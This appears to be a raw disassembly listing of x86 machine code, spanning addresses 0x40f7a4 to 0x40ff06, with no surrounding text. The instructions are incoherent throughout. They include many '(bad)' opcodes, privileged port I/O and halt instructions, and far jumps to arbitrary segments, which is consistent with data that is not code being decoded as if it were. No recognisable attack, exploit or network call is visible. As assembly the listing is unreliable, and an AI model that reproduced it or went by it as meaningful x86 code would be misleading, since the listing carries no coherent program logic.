  40f7a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f7a5:	add    DWORD PTR [edi+0x844c8b5],eax
  40f7ab:	mov    ah,BYTE PTR [esi+0x35ba7c24]
  40f7b1:	into   
  40f7b2:	ja     0x40f831
  40f7b4:	jmp    0x40f7ee
  40f7b6:	pop    es
  40f7b7:	mov    bl,0x57
  40f7b9:	sub    DWORD PTR [edi+edi*4-0x6c81d7bd],esi
  40f7c0:	out    0x3d,al
  40f7c2:	lds    ebx,FWORD PTR [ebx]
  40f7c4:	and    ebp,DWORD PTR [edi+0x18223b07]
  40f7ca:	mov    bh,0x5
  40f7cc:	mov    eax,0x2463e999
  40f7d1:	sbb    BYTE PTR ds:0xd8d1d683,cl
  40f7d7:	out    dx,al
  40f7d8:	or     DWORD PTR [eax],esp
  40f7da:	dec    edx
  40f7db:	sti    
  40f7dc:	data16 jle 0x40f78f
  40f7df:	add    esi,edx
  40f7e1:	mov    ebx,0x434f46bb
  40f7e6:	(bad)  [esi]
  40f7e8:	pop    cx
  40f7ea:	push   ds
  40f7eb:	and    dh,BYTE PTR [ecx+ebp*1+0x73a4e3ba]
  40f7f2:	popa   
  40f7f3:	mov    bh,0xcc
  40f7f5:	pop    esi
  40f7f6:	shl    DWORD PTR [ebp+0x71dff9e3],0x39
  40f7fd:	mov    eax,ds:0x2f372fea
  40f802:	sub    bh,BYTE PTR [edi-0x1741c4ef]
  40f808:	add    BYTE PTR [edx+0x78],ah
  40f80b:	or     DWORD PTR [edi+0x49e2121d],esi
  40f811:	scas   eax,DWORD PTR es:[edi]
  40f812:	fisub  WORD PTR [ebp-0xb]
  40f815:	and    BYTE PTR [ecx-0x635176da],bl
  40f81b:	mov    eax,ds:0x6fc8dc39
  40f820:	cmp    bl,bh
  40f822:	out    0x6c,eax
  40f824:	popa   
  40f825:	jo     0x40f7bc
  40f827:	xchg   edi,eax
  40f828:	jp     0x40f88a
  40f82a:	jbe    0x40f8aa
  40f82c:	sub    DWORD PTR [esi],0x32
  40f82f:	xchg   ecx,eax
  40f830:	mov    WORD PTR fs:[ebp-0x5f],ss
  40f834:	cwde   
  40f835:	fwait
  40f836:	cmc    
  40f837:	xchg   edi,eax
  40f838:	pushf  
  40f839:	push   ecx
  40f83a:	pop    edi
  40f83b:	and    ebx,edx
  40f83d:	mov    ecx,0x25c409aa
  40f842:	mov    ch,0x7b
  40f844:	xchg   ecx,eax
  40f845:	or     eax,0x6d55732d
  40f84a:	add    edi,eax
  40f84c:	loop   0x40f85b
  40f84e:	jnp    0x40f805
  40f850:	push   es
  40f851:	add    al,0x98
  40f853:	jg     0x40f8ab
  40f855:	or     BYTE PTR [esi+esi*1],dh
  40f858:	test   ebp,edx
  40f85a:	iret   
  40f85b:	and    eax,0x125c2051
  40f860:	adc    BYTE PTR [ebx+0x4e8e080f],ch
  40f866:	add    al,0xd0
  40f868:	fcmovnu st,st(3)
  40f86a:	sahf   
  40f86b:	jnp    0x40f814
  40f86d:	push   ebx
  40f86e:	dec    ebp
  40f86f:	es retf 
  40f871:	imul   esp,eax,0x66cd75ac
  40f877:	(bad)  
  40f878:	arpl   bp,si
  40f87a:	adc    DWORD PTR [edx-0x1501db7],edx
  40f880:	in     eax,0x94
  40f882:	push   eax
  40f883:	add    DWORD PTR [edi-0x3b],esp
  40f886:	mov    edi,0xfffea486
  40f88b:	jg     0x40f8b1
  40f88d:	xchg   ecx,eax
  40f88e:	retf   
  40f88f:	inc    esp
  40f890:	sbb    BYTE PTR [esi+0xa794d4b],0xc
  40f897:	inc    esp
  40f898:	xchg   DWORD PTR [ebx+0x0],eax
  40f89b:	mov    edx,0x667c4ff9
  40f8a0:	mov    ah,0x4f
  40f8a2:	cs mov ebp,0xa6cd258e
  40f8a8:	lea    edx,[ecx]
  40f8aa:	jmp    0x214e8fc7
  40f8af:	(bad)  
  40f8b0:	(bad)  
  40f8b1:	sbb    ebx,DWORD PTR [esi]
  40f8b3:	adc    DWORD PTR [esi+esi*2],ebp
  40f8b6:	dec    esp
  40f8b7:	ins    BYTE PTR es:[edi],dx
  40f8b8:	push   0xcf1817cc
  40f8bd:	push   es
  40f8be:	(bad)  
  40f8bf:	daa    
  40f8c0:	(bad)  
  40f8c1:	call   0xa3a9428d
  40f8c6:	mov    eax,0x3a8cb05e
  40f8cb:	js     0x40f934
  40f8cd:	test   al,0x4d
  40f8cf:	mov    cl,0x2c
  40f8d1:	ret    0xd52b
  40f8d4:	jmp    0x40f88e
  40f8d6:	cmp    bh,BYTE PTR [esi-0x2c]
  40f8d9:	push   eax
  40f8da:	fnsave [eax-0x6ad8a979]
  40f8e0:	jge    0x40f8ae
  40f8e2:	addr16 mov eax,ds:0x226d
  40f8e6:	push   ecx
  40f8e7:	out    0xe,eax
  40f8e9:	cmp    esi,DWORD PTR [edx+0x17]
  40f8ec:	fimul  DWORD PTR [esi-0x1c]
  40f8ef:	int3   
  40f8f0:	retf   0x5426
  40f8f3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f8f4:	loop   0x40f96c
  40f8f6:	inc    ebp
  40f8f7:	xchg   edi,eax
  40f8f8:	cmp    DWORD PTR [edi],ebp
  40f8fa:	cmp    DWORD PTR ds:0xa48b6f73,eax
  40f900:	scas   eax,DWORD PTR es:[edi]
  40f901:	fs sbb al,0x70
  40f904:	inc    esi
  40f905:	or     eax,DWORD PTR gs:[esi-0x54]
  40f909:	retf   
  40f90a:	clc    
  40f90b:	les    edi,FWORD PTR [ecx-0x2068cb85]
  40f911:	cmc    
  40f912:	pop    ds
  40f913:	rcr    DWORD PTR [edi-0x5adef268],1
  40f919:	mov    eax,0x3c144fb9
  40f91e:	out    dx,al
  40f91f:	or     BYTE PTR [edi],bh
  40f921:	clc    
  40f922:	push   edi
  40f923:	clc    
  40f924:	add    al,0xa1
  40f926:	test   al,0xe0
  40f928:	sub    ch,BYTE PTR [edi-0x46d6845c]
  40f92e:	scas   eax,DWORD PTR es:[edi]
  40f92f:	inc    ebp
  40f930:	mov    eax,ds:0x856a05f5
  40f935:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f936:	cmp    ah,BYTE PTR [edi+0x59]
  40f939:	mov    eax,ds:0xaa581a4b
  40f93e:	(bad)  
  40f93f:	scas   al,BYTE PTR es:[edi]
  40f940:	fcomp  DWORD PTR [ecx-0x1]
  40f943:	sahf   
  40f944:	aaa    
  40f945:	int    0x11
  40f947:	rcl    DWORD PTR [ebx-0x18],cl
  40f94a:	jnp    0x40f920
  40f94c:	mov    dh,0x28
  40f94e:	and    eax,0xa6c01f46
  40f953:	out    0x29,eax
  40f955:	push   esi
  40f956:	pop    ds
  40f957:	addr16 ret 0xf7ff
  40f95b:	clc    
  40f95c:	jne    0x40f948
  40f95e:	mov    DWORD PTR [esi-0x3a7fb5cb],edx
  40f964:	add    eax,0x5b329e85
  40f969:	(bad)  
  40f96a:	stos   DWORD PTR es:[edi],eax
  40f96b:	in     al,0xf4
  40f96d:	jno    0x40f938
  40f96f:	in     eax,0x4c
  40f971:	push   ecx
  40f972:	push   ecx
  40f973:	adc    ecx,esi
  40f975:	popf   
  40f976:	ins    BYTE PTR es:[edi],dx
  40f977:	lods   eax,DWORD PTR ds:[esi]
  40f978:	push   ebx
  40f979:	hlt    
  40f97a:	sub    BYTE PTR [eax+0x268e4769],ah
  40f980:	jle    0x40f9ff
  40f982:	iret   
  40f983:	out    0x80,al
  40f985:	mov    al,ds:0x217ddeeb
  40f98a:	out    0x43,al
  40f98c:	jecxz  0x40f9b4
  40f98e:	jmp    0x40f924
  40f990:	push   0x3ce1e11e
  40f995:	js     0x40f9ae
  40f997:	clc    
  40f998:	xor    eax,0xd4b711d2
  40f99d:	jp     0x40f9a1
  40f99f:	pop    esi
  40f9a0:	mov    ah,0xf3
  40f9a2:	push   esp
  40f9a3:	dec    eax
  40f9a4:	out    dx,eax
  40f9a5:	lea    ebp,[esi]
  40f9a7:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f9a8:	out    0xd2,al
  40f9aa:	cmp    BYTE PTR [esi-0x6c7ff07e],cl
  40f9b0:	in     eax,dx
  40f9b1:	(bad)  
  40f9b2:	int    0xe0
  40f9b4:	push   cs
  40f9b5:	jne    0x40f9ff
  40f9b7:	add    BYTE PTR [ecx+edx*2],dh
  40f9ba:	clc    
  40f9bb:	push   edi
  40f9bc:	(bad)  
  40f9be:	sbb    al,0x74
  40f9c0:	adc    DWORD PTR [esi],eax
  40f9c2:	dec    eax
  40f9c3:	cwde   
  40f9c4:	retf   0x8dc4
  40f9c7:	into   
  40f9c8:	mov    ebp,eax
  40f9ca:	(bad)  
  40f9cb:	and    bh,BYTE PTR [ecx+0x1c]
  40f9ce:	mov    ebx,0x978c1c52
  40f9d3:	hlt    
  40f9d4:	sbb    BYTE PTR ds:0x7755f853,bl
  40f9da:	and    BYTE PTR [esi+eax*1],0x4b
  40f9de:	cld    
  40f9df:	dec    edi
  40f9e0:	push   edi
  40f9e1:	xchg   esi,eax
  40f9e2:	mov    ss,esp
  40f9e4:	fs aam 0xc6
  40f9e7:	sbb    eax,0x27110b4
  40f9ec:	fwait
  40f9ed:	fwait
  40f9ee:	jbe    0x40fa66
  40f9f0:	enter  0x41ca,0x96
  40f9f4:	ret    0xccf1
  40f9f7:	call   0xf9b544d3
  40f9fc:	mov    ebx,0xdd7513a
  40fa01:	or     al,BYTE PTR [eax]
  40fa03:	mov    eax,ds:0x32bd35cd
  40fa08:	adc    eax,0x37295d48
  40fa0d:	jl     0x40fa7c
  40fa0f:	xor    ecx,0xffffffd6
  40fa12:	test   al,0xb1
  40fa14:	in     al,dx
  40fa15:	int    0x36
  40fa17:	sbb    eax,0x59
  40fa1a:	fld    DWORD PTR fs:[edi+0x6f]
  40fa1e:	outs   dx,DWORD PTR ds:[esi]
  40fa1f:	pop    ss
  40fa20:	stos   DWORD PTR es:[edi],eax
  40fa21:	std    
  40fa22:	(bad)  
  40fa23:	daa    
  40fa24:	mov    WORD PTR [ebx-0x42ac424b],?
  40fa2a:	inc    ecx
  40fa2b:	sub    al,0xec
  40fa2d:	push   esp
  40fa2e:	adc    eax,0x1dad0167
  40fa33:	xor    ch,bl
  40fa35:	retf   
  40fa36:	push   edi
  40fa37:	leave  
  40fa38:	inc    ecx
  40fa39:	xchg   esp,eax
  40fa3a:	rcr    BYTE PTR [ebx+ebp*2+0x2da998],0xa6
  40fa42:	mov    esp,0xd4ed71ad
  40fa47:	clc    
  40fa48:	sbb    DWORD PTR [ecx+ebp*8+0xd],edi
  40fa4c:	jecxz  0x40fa21
  40fa4e:	imul   ecx,DWORD PTR [ebp-0x12],0xffffffdc
  40fa52:	fsubr  DWORD PTR [edx-0x49]
  40fa55:	out    0xcd,eax
  40fa57:	popa   
  40fa58:	imul   ecx,ecx,0x8e458998
  40fa5e:	or     esi,DWORD PTR [edi+0x624b284]
  40fa64:	sbb    BYTE PTR [eax],al
  40fa66:	ss scas eax,DWORD PTR es:[edi]
  40fa68:	sbb    ah,BYTE PTR [eax+0x5a2d122a]
  40fa6e:	sbb    al,0x9
  40fa70:	mov    dh,0x17
  40fa72:	bound  ebx,QWORD PTR [ebx+0x74]
  40fa75:	push   edi
  40fa76:	mov    ch,0x6
  40fa78:	sub    bl,dl
  40fa7a:	dec    esp
  40fa7b:	inc    ecx
  40fa7c:	push   ebx
  40fa7d:	push   ss
  40fa7e:	jle    0x40faa5
  40fa80:	xor    bl,BYTE PTR [ecx-0x74eaccba]
  40fa86:	loop   0x40fa6b
  40fa88:	xor    eax,esi
  40fa8a:	sar    BYTE PTR [edi-0x1a176227],1
  40fa90:	mov    edx,cs
  40fa92:	mov    dl,0x9c
  40fa94:	xchg   edx,eax
  40fa95:	fldenv [ebx+0x34]
  40fa98:	inc    ebx
  40fa99:	shr    al,0x84
  40fa9c:	in     eax,0x45
  40fa9e:	in     al,0x85
  40faa0:	hlt    
  40faa1:	hlt    
  40faa2:	ins    DWORD PTR es:[edi],dx
  40faa3:	pop    ecx
  40faa4:	scas   eax,DWORD PTR es:[edi]
  40faa5:	mov    ecx,0x82156f58
  40faaa:	ret    0xeb61
  40faad:	dec    eax
  40faae:	adc    DWORD PTR [ecx+0x202ebaea],edx
  40fab4:	sbb    BYTE PTR [ebx+0x7f],dh
  40fab7:	adc    eax,0x29659642
  40fabc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fabd:	push   ss
  40fabe:	adc    al,0x61
  40fac0:	jg     0x40fb04
  40fac2:	popf   
  40fac3:	jb     0x40fb04
  40fac5:	daa    
  40fac6:	sbb    BYTE PTR [ebx+0x53d1289],ah
  40facc:	ins    BYTE PTR es:[edi],dx
  40facd:	mov    WORD PTR [eax],ds
  40facf:	dec    eax
  40fad0:	je     0x40fa7d
  40fad2:	cdq    
  40fad3:	jmp    0x40fa86
  40fad5:	and    BYTE PTR [ebx-0x5d9f335f],bh
  40fadb:	and    al,0x56
  40fadd:	xor    dh,BYTE PTR [ecx-0x54]
  40fae0:	sbb    bl,BYTE PTR ds:0x71edbb7f
  40fae6:	mov    ds:0xc6967384,eax
  40faeb:	iret   
  40faec:	mov    esp,0x5f9b34db
  40faf1:	aad    0x2
  40faf3:	outs   dx,BYTE PTR ds:[esi]
  40faf4:	jmp    0xc7f0:0x3ae49626
  40fafb:	fild   WORD PTR [eax+esi*2+0x6e]
  40faff:	or     al,0xe0
  40fb01:	and    BYTE PTR ds:0x82eae5c3,ch
  40fb07:	and    dl,BYTE PTR [ecx+0x76e22364]
  40fb0d:	ins    BYTE PTR es:[edi],dx
  40fb0e:	mov    esp,0x5eff4818
  40fb13:	or     BYTE PTR [edx+0x55517fd4],al
  40fb19:	or     ebp,DWORD PTR [edx-0x37eec2a9]
  40fb1f:	pop    ebx
  40fb20:	(bad)  
  40fb21:	xor    BYTE PTR [edx+esi*4+0x7b580e76],bh
  40fb28:	test   BYTE PTR [edx],dl
  40fb2a:	adc    cl,BYTE PTR [edx]
  40fb2c:	enter  0x9f49,0x32
  40fb30:	pop    edx
  40fb31:	das    
  40fb32:	mov    edi,0x5028183c
  40fb37:	(bad)  
  40fb38:	out    dx,eax
  40fb39:	cmp    DWORD PTR [edi-0x5e],esp
  40fb3c:	push   cs
  40fb3d:	cmp    al,0x73
  40fb3f:	in     al,dx
  40fb40:	mov    ds:0x72185498,eax
  40fb45:	sub    dl,ah
  40fb47:	nop
  40fb48:	or     bh,BYTE PTR [edi-0x66]
  40fb4b:	pushf  
  40fb4c:	and    BYTE PTR [ecx+edi*2],0x60
  40fb50:	sahf   
  40fb51:	scas   eax,DWORD PTR es:[edi]
  40fb52:	dec    esi
  40fb53:	sbb    DWORD PTR [esi-0x5856c4e],ebx
  40fb59:	xchg   esp,eax
  40fb5a:	cmp    edi,DWORD PTR [ecx-0x17]
  40fb5d:	hlt    
  40fb5e:	stos   DWORD PTR es:[edi],eax
  40fb5f:	ja     0x40fb29
  40fb61:	jle    0x40fb9c
  40fb63:	mov    ch,0x6
  40fb65:	repnz inc edx
  40fb67:	aas    
  40fb68:	neg    BYTE PTR [ecx+0xd77016c]
  40fb6e:	pop    ebp
  40fb6f:	(bad)  
  40fb70:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40fb71:	scas   al,BYTE PTR es:[edi]
  40fb72:	ins    BYTE PTR es:[edi],dx
  40fb73:	or     al,ah
  40fb75:	jbe    0x40fb73
  40fb77:	push   edx
  40fb78:	inc    edi
  40fb79:	idiv   DWORD PTR [edi-0x42937285]
  40fb7f:	fs into 
  40fb81:	lea    edx,[edx-0x59934af3]
  40fb87:	xor    al,0xbe
  40fb89:	add    bl,BYTE PTR [edx]
  40fb8b:	mov    BYTE PTR [edx+0x29],al
  40fb8e:	add    al,0x86
  40fb90:	mov    ds:0xb1d9395a,al
  40fb95:	sti    
  40fb96:	mov    DWORD PTR [edi+0x3800df43],esp
  40fb9c:	jmp    0x47c2:0x515e0a65
  40fba3:	mov    esp,0xe3b08761
  40fba8:	mov    ah,0x6d
  40fbaa:	push   ebp
  40fbab:	and    al,0x88
  40fbad:	into   
  40fbae:	push   ds
  40fbaf:	push   0x4c
  40fbb1:	mov    ecx,0x4c722a9c
  40fbb6:	xchg   ebx,eax
  40fbb7:	lahf   
  40fbb8:	out    dx,eax
  40fbb9:	(bad)  
  40fbba:	nop
  40fbbb:	and    al,bl
  40fbbd:	pop    eax
  40fbbe:	(bad)  
  40fbc0:	in     al,0x8
  40fbc2:	sub    BYTE PTR [ecx+0xe5f4b6f],0xf6
  40fbc9:	add    ah,BYTE PTR es:[eax+0x5d]
  40fbcd:	and    eax,0xea9bacf6
  40fbd2:	iret   
  40fbd3:	mov    al,0x9b
  40fbd5:	das    
  40fbd6:	add    ecx,edi
  40fbd8:	cwde   
  40fbd9:	mov    ds:0x635dd4f8,al
  40fbde:	pop    ebx
  40fbdf:	dec    ebp
  40fbe0:	loopne 0x40fc05
  40fbe2:	outs   dx,DWORD PTR ds:[esi]
  40fbe3:	loope  0x40fc05
  40fbe5:	mov    esi,0x5ffb51f9
  40fbea:	lds    ebp,FWORD PTR [edx+0x3718827]
  40fbf0:	jg     0x40fbfe
  40fbf2:	mov    ebx,gs
  40fbf4:	mov    ds:0xc0a24e39,al
  40fbf9:	sub    bl,bl
  40fbfb:	dec    edi
  40fbfc:	aaa    
  40fbfd:	fwait
  40fbfe:	xchg   DWORD PTR [edx+ebx*1+0x7668c7fe],ebp
  40fc05:	repz mov eax,ds:0x29b75f99
  40fc0b:	mov    WORD PTR [ecx-0x22],gs
  40fc0e:	jb     0x40fc27
  40fc10:	in     al,0x29
  40fc12:	scas   eax,DWORD PTR es:[edi]
  40fc13:	jno    0x40fc80
  40fc15:	xor    al,0xb1
  40fc17:	or     eax,0xd3c99b13
  40fc1c:	jb     0x40fc85
  40fc1e:	scas   al,BYTE PTR es:[edi]
  40fc1f:	addr16 mov ecx,0x47c8f006
  40fc25:	jo     0x40fbe7
  40fc27:	jmp    0x40fbb6
  40fc29:	add    DWORD PTR [ebp+0x24],esp
  40fc2c:	scas   al,BYTE PTR es:[edi]
  40fc2d:	xchg   esi,eax
  40fc2e:	or     edx,esi
  40fc30:	loopne 0x40fca3
  40fc32:	(bad)  
  40fc33:	sar    DWORD PTR [esi+0x4e],cl
  40fc36:	xchg   ebx,eax
  40fc37:	sbb    al,0xd0
  40fc39:	mov    dh,BYTE PTR [edi]
  40fc3b:	add    al,0x80
  40fc3d:	mov    dl,0xd4
  40fc3f:	mov    WORD PTR [ebp+0x7b165163],es
  40fc45:	(bad)  
  40fc46:	call   0xdabe:0x77ccce0a
  40fc4d:	cdq    
  40fc4e:	adc    eax,0x88d19cd9
  40fc53:	inc    ecx
  40fc54:	int    0x7a
  40fc56:	fistp  WORD PTR [ebx-0x1f]
  40fc59:	xchg   ebp,eax
  40fc5a:	test   al,0xda
  40fc5c:	leave  
  40fc5d:	ss xchg esp,eax
  40fc5f:	fwait
  40fc60:	(bad)  
  40fc61:	fstp   QWORD PTR [edi-0x5a]
  40fc64:	pop    ebp
  40fc65:	jns    0x40fc24
  40fc67:	sbb    edx,DWORD PTR [edi+eax*2+0xec533d0]
  40fc6e:	stos   DWORD PTR es:[edi],eax
  40fc6f:	dec    ebp
  40fc70:	cdq    
  40fc71:	dec    ecx
  40fc72:	lods   eax,DWORD PTR ds:[esi]
  40fc73:	or     edi,ebp
  40fc75:	jne    0x40fc49
  40fc77:	push   edx
  40fc78:	cmp    cl,BYTE PTR [eax+0x19]
  40fc7b:	mov    ds:0xda5ff801,eax
  40fc80:	test   DWORD PTR [ecx-0x1a2c6f28],0x18bde34b
  40fc8a:	sub    DWORD PTR [ebx+ebp*4+0x12],esp
  40fc8e:	jmp    0x6f872e30
  40fc93:	iret   
  40fc94:	cs or  eax,0xa1ce9015
  40fc9a:	xor    al,0x74
  40fc9c:	daa    
  40fc9d:	pop    eax
  40fc9e:	mov    edi,0xef1ebfd6
  40fca3:	ja     0x40fc3a
  40fca5:	mov    BYTE PTR [eax+esi*2-0xc],al
  40fca9:	mov    al,ds:0x59ee7e70
  40fcae:	in     al,dx
  40fcaf:	adc    DWORD PTR [eax+0x12],0x734cf391
  40fcb6:	(bad)  
  40fcb7:	jl     0x40fca7
  40fcb9:	or     eax,ecx
  40fcbb:	dec    edx
  40fcbc:	scas   eax,DWORD PTR es:[edi]
  40fcbd:	push   0xc1624e7c
  40fcc2:	pop    eax
  40fcc3:	push   edi
  40fcc4:	ret    0x2218
  40fcc7:	aaa    
  40fcc8:	cmp    BYTE PTR [ebx+0x5b4b99ab],dl
  40fcce:	in     al,dx
  40fccf:	fistp  QWORD PTR [ecx+0x1f]
  40fcd2:	nop
  40fcd3:	adc    ebx,DWORD PTR [edx-0x55]
  40fcd6:	jecxz  0x40fd1f
  40fcd8:	and    al,0x36
  40fcda:	jo     0x40fcdf
  40fcdc:	xor    BYTE PTR [ebp-0x1babb50e],ch
  40fce2:	test   al,0x82
  40fce4:	dec    esi
  40fce5:	adc    bl,BYTE PTR [ecx]
  40fce7:	sbb    DWORD PTR [ecx],eax
  40fce9:	shl    DWORD PTR [edx+0x45b1443b],0xf3
  40fcf0:	popf   
  40fcf1:	xor    dl,BYTE PTR [ebp+0x7d]
  40fcf4:	(bad)  
  40fcf5:	aaa    
  40fcf6:	gs mov dl,0xbb
  40fcf9:	pop    ebx
  40fcfa:	sbb    eax,0x5af01203
  40fcff:	popf   
  40fd00:	cmp    bl,0x1
  40fd03:	add    DWORD PTR [ebp-0x5c],esi
  40fd06:	jmp    0x4d63:0xfaca3054
  40fd0d:	out    0xc5,eax
  40fd0f:	cs mov bh,0x22
  40fd12:	arpl   ax,cx
  40fd14:	and    dl,BYTE PTR [ebx-0x9b3ddd7]
  40fd1a:	gs std 
  40fd1c:	(bad)  
  40fd1e:	dec    esi
  40fd1f:	lahf   
  40fd20:	fisub  DWORD PTR [eax+0x31]
  40fd23:	adc    bh,ah
  40fd25:	test   eax,0x729529ee
  40fd2a:	inc    esp
  40fd2b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fd2c:	out    dx,eax
  40fd2d:	fsubr  st(5),st
  40fd2f:	dec    eax
  40fd30:	mov    BYTE PTR [ebx+0x7e019edb],0x6b
  40fd37:	sbb    edx,edx
  40fd39:	mov    al,0xf0
  40fd3b:	jmp    0x40fd82
  40fd3d:	push   esp
  40fd3e:	jp     0x40fd65
  40fd40:	cmc    
  40fd41:	xor    ecx,DWORD PTR [ecx+edx*4-0xe09def5]
  40fd48:	mov    bl,0x2d
  40fd4a:	(bad)  
  40fd4b:	pop    eax
  40fd4c:	xor    al,0x24
  40fd4e:	or     al,0xba
  40fd50:	bound  ecx,QWORD PTR [bx+si]
  40fd53:	call   DWORD PTR [eiz*8+0x619cf764]
  40fd5a:	loopne 0x40fd84
  40fd5c:	retf   0x5038
  40fd5f:	(bad)  
  40fd60:	fsubrp st(6),st
  40fd62:	sub    eax,0xf27fded5
  40fd67:	jo     0x40fdc5
  40fd69:	hlt    
  40fd6a:	int    0xfc
  40fd6c:	fld    DWORD PTR fs:[esi-0x21]
  40fd70:	fnsave ds:0x155f16a
  40fd76:	inc    esi
  40fd77:	lds    ebp,FWORD PTR [ecx]
  40fd79:	lds    esi,FWORD PTR [ecx+0xd]
  40fd7c:	xor    BYTE PTR [edx+0x67],al
  40fd7f:	jmp    0x8ca8:0xf96fb5b3
  40fd86:	mov    ebp,0x8872108b
  40fd8b:	jo     0x40fddc
  40fd8d:	xor    al,0xab
  40fd8f:	dec    edx
  40fd90:	mov    eax,ds:0xd1200b71
  40fd95:	sbb    ecx,esp
  40fd97:	out    0x21,al
  40fd99:	mov    bl,0x78
  40fd9b:	dec    esp
  40fd9c:	mov    ?,WORD PTR [edi]
  40fd9e:	loope  0x40fd54
  40fda0:	dec    esp
  40fda1:	push   ss
  40fda2:	pop    ss
  40fda3:	lods   eax,DWORD PTR ds:[esi]
  40fda4:	jae    0x40fd84
  40fda6:	cmp    ecx,ecx
  40fda8:	(bad)  
  40fda9:	lahf   
  40fdaa:	loopne 0x40fe27
  40fdac:	add    eax,DWORD PTR [eax]
  40fdae:	pushf  
  40fdaf:	cdq    
  40fdb0:	jmp    0x509517bf
  40fdb5:	dec    edi
  40fdb6:	scas   eax,DWORD PTR es:[edi]
  40fdb7:	call   0xb2fdaa1
  40fdbc:	iret   
  40fdbd:	jecxz  0x40fdf2
  40fdbf:	scas   eax,DWORD PTR es:[edi]
  40fdc0:	sbb    DWORD PTR [ecx+0x1d],edi
  40fdc3:	ins    DWORD PTR es:[edi],dx
  40fdc4:	push   esp
  40fdc5:	xchg   ebp,eax
  40fdc6:	in     eax,dx
  40fdc7:	pop    edx
  40fdc8:	sub    dh,bh
  40fdca:	cs pop ebp
  40fdcc:	jl     0x40fdc2
  40fdce:	mov    ebp,0xc616d50a
  40fdd3:	dec    ecx
  40fdd4:	iret   
  40fdd5:	sub    eax,0x5179918f
  40fdda:	or     al,0xaf
  40fddc:	adc    esp,DWORD PTR [esi+0x4e]
  40fddf:	push   eax
  40fde0:	lods   eax,DWORD PTR ds:[esi]
  40fde1:	cmp    BYTE PTR [ebp-0x2c],ah
  40fde4:	(bad)  
  40fde5:	mov    edx,0x94402cf9
  40fdea:	mov    esi,eax
  40fdec:	dec    esp
  40fded:	sti    
  40fdee:	out    dx,al
  40fdef:	and    ecx,edi
  40fdf1:	add    eax,0x4f4ae3b9
  40fdf6:	sbb    al,0xf8
  40fdf8:	jle    0x40fe1c
  40fdfa:	je     0x40fded
  40fdfc:	cmp    al,0x30
  40fdfe:	dec    DWORD PTR [ecx]
  40fe00:	add    BYTE PTR [ebx+0x59],bl
  40fe03:	xor    DWORD PTR [eax-0x7ae7e5c6],esp
  40fe09:	inc    eax
  40fe0a:	push   ss
  40fe0b:	and    al,0x94
  40fe0d:	sbb    BYTE PTR [esi+0x1a105839],cl
  40fe13:	es push eax
  40fe15:	retf   
  40fe16:	add    BYTE PTR [edx-0x36],al
  40fe19:	inc    ecx
  40fe1a:	pop    edx
  40fe1b:	shl    DWORD PTR [esi-0x2b],cl
  40fe1e:	pop    edx
  40fe1f:	stos   BYTE PTR es:[edi],al
  40fe20:	mov    ebx,0xd3e2f498
  40fe25:	pop    ebx
  40fe26:	sahf   
  40fe27:	dec    esp
  40fe28:	xor    DWORD PTR [ecx-0x5a],esi
  40fe2b:	push   ecx
  40fe2c:	pushf  
  40fe2d:	mov    ebp,0x2e7eb678
  40fe32:	push   es
  40fe33:	loopne 0x40fdc2
  40fe35:	add    DWORD PTR [edi],0xa3c4a6af
  40fe3b:	push   ss
  40fe3c:	push   ebp
  40fe3d:	stos   DWORD PTR es:[edi],eax
  40fe3e:	adc    ah,BYTE PTR [ebp-0x28]
  40fe41:	and    eax,0x22997652
  40fe46:	mov    bl,al
  40fe48:	scas   eax,DWORD PTR es:[edi]
  40fe49:	out    0x83,eax
  40fe4b:	mov    dl,0xe5
  40fe4d:	sbb    al,0xcf
  40fe4f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40fe50:	add    DWORD PTR [edi],esp
  40fe52:	js     0x40fe69
  40fe54:	sbb    cl,BYTE PTR [edx-0x2d4eda61]
  40fe5a:	mov    ecx,0x78ffe313
  40fe5f:	xlat   BYTE PTR ds:[ebx]
  40fe60:	mov    ah,0xf7
  40fe62:	mov    ?,WORD PTR [eax+0x2e]
  40fe65:	mov    WORD PTR [ecx+0x5b50af1f],gs
  40fe6b:	sub    eax,0x36873020
  40fe70:	mov    al,0xb8
  40fe72:	addr16 sti 
  40fe74:	ficomp WORD PTR [edi]
  40fe76:	cld    
  40fe77:	inc    ecx
  40fe78:	pop    eax
  40fe79:	ror    BYTE PTR [esi+ecx*4+0x32],cl
  40fe7d:	or     eax,0x249f817b
  40fe82:	hlt    
  40fe83:	mov    ebx,0xc42f1e42
  40fe88:	push   0xfffffff4
  40fe8a:	xchg   edx,edi
  40fe8c:	jge    0x40fe4b
  40fe8e:	adc    eax,0x5e8a82a
  40fe93:	push   edx
  40fe94:	cmp    edi,DWORD PTR [ebx-0x737faedf]
  40fe9a:	(bad)  
  40fe9c:	pop    ecx
  40fe9d:	sbb    al,0x41
  40fe9f:	mov    ds:0x29509f6e,eax
  40fea4:	ss (bad) 
  40fea6:	and    cl,BYTE PTR [ebx+0x9]
  40fea9:	pop    esi
  40feaa:	mov    ah,0x66
  40feac:	test   ch,bl
  40feae:	sbb    bl,BYTE PTR [eax-0x475320a8]
  40feb4:	popf   
  40feb5:	imul   edi,DWORD PTR [ecx+0x36],0x28ab6b9b
  40febc:	cmp    eax,0xa3fd44b3
  40fec1:	hlt    
  40fec2:	cmp    DWORD PTR [esi],esp
  40fec4:	retf   0x7619
  40fec7:	cmc    
  40fec8:	and    ebx,edx
  40feca:	cmp    ah,BYTE PTR [ebx-0x73b473ae]
  40fed0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40fed1:	sub    al,0x26
  40fed3:	pop    es
  40fed4:	das    
  40fed5:	shl    DWORD PTR [edi-0x29d488f2],cl
  40fedb:	pop    edi
  40fedc:	pop    es
  40fedd:	fsub   QWORD PTR [ecx+0xe]
  40fee0:	xor    dl,cl
  40fee2:	in     eax,0x9
  40fee4:	mov    edi,0x9f282bef
  40fee9:	into   
  40feea:	sti    
  40feeb:	xchg   eax,ebp
  40feed:	cmc    
  40feee:	lea    bp,[eax*4+0x24222691]
  40fef6:	cdq    
  40fef7:	imul   ebx,DWORD PTR [ebx],0x5f
  40fefa:	push   0xffffffce
  40fefc:	imul   ebx,esp,0xcf41b7e7
  40ff02:	int    0x11
  40ff04:	sbb    bl,al
  40ff06:	inc    eax
